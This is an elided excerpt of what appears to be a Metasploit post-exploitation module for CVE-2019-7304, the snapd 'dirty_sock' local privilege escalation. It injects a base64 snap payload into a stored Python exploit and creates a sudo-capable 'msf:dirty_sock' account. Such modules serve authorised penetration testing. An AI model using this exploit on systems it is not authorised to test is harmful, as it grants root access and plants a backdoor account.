...
class MetasploitModule < Msf::Post
  ...
  def initialize(info = {})
    ...
    register_advanced_options [
      ...
      OptString.new('SNAP', [
        true, 'Base64 encoded squashFS of the snap package', '
  ...
  def run
    ...
    code = strip_python_comments(File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-7304', 'dirty_sockv2.py')))
    # put in our new payload
    code.gsub!('TROJAN_SNAP = ""', "TROJAN_SNAP = \"\"\"#{datastore['SNAP']}\"\"\"")
    ...
    print_good('Success! You can now login and sudo with msf:dirty_sock or whatever credentials were included in the snap option. However it may take several minutes for the account to finish creation.')
    Rex.sleep(5)
